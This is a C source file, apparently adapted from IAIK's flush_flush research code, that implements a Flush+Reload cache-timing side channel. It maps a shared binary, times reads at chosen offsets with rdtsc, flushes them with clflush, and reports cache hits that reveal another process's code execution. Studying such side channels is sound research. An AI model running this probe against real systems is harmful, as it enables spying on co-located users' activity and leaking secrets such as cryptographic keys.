/**
 * This program is based on the work from the Institute of Applied Information Processing and Communications (IAIK)
 * available here: https://github.com/IAIK/flush_flush
 */


#include <pthread.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <string.h>

#define THRESHOLD 150
#define PROBE_TIME 5000000UL

unsigned long start_time = 0;
unsigned long old_time = 0;

typedef struct {
    char *label;
    unsigned int offset;
} s_probe;

s_probe probes[16];

inline int probe(char *adrs) {
    volatile unsigned long time;

    asm __volatile__ (
    "  mfence             \n"
    "  lfence             \n"
    "  rdtsc              \n"
    "  lfence             \n"
    "  movl %%eax, %%esi  \n"
    "  movl (%1), %%eax   \n"
    "  lfence             \n"
    "  rdtsc              \n"
    "  subl %%esi, %%eax  \n"
    "  clflush 0(%1)      \n"
    : "=a" (time)
    : "c" (adrs)
    :  "%esi", "%edx");

    return time;
}

inline unsigned long gettime() {
    volatile unsigned long tl;

    asm __volatile__(
    "lfence\n"
    "rdtsc"
    : "=a" (tl)
    :
    : "%edx");

    return tl;
}

long micros() {
    struct timeval current;

    gettimeofday(&current, NULL);

    return current.tv_sec * (int) 1e6 + current.tv_usec;
}

void flush_and_reload(void *addr, char *label) {

    size_t delta = probe(addr);

    if (delta < THRESHOLD) {
        printf("Cache Hit for %s %10lu after %10lu us\n", label, delta, micros() - start_time);
    }

}

int main(int argc, char **argv) {
    if (argc < 3)
        return 1;

    char *filename = argv[1];
    char *offsetp = argv[2];

    char num_probes = 0;

    for (int i = 2; i < argc && i < 16; i++) {
        char *label = strtok(argv[i], ":");

        if (!label)
            return 2;

        char *offsetp = strtok(NULL, ":");

        if (!offsetp)
            return 2;

        unsigned int offset = 0;
        if (!sscanf(offsetp, "%x", &offset)) {
            return 2;
        }

        probes[i - 2] = (s_probe) {label, offset};
        num_probes += 1;
    }

    int fd = open(filename, O_RDONLY);
    if (fd < 3)
        return 3;

    // map the binary up to 64 MB
    unsigned char *addr = (unsigned char *) mmap(0, 64 * 1024 * 1024, PROT_READ, MAP_SHARED, fd, 0);

    if (addr == (void *) -1)
        return 4;

    start_time = micros();

    while (1) {

        unsigned long time = gettime();

        if (time - old_time >= PROBE_TIME) {

            for (int i = 0; i < num_probes; i++) {
                s_probe prb = probes[i];

                flush_and_reload(addr + prb.offset, prb.label);
            }

            sched_yield();
            old_time = time;
        }


    }

    return 0;
}
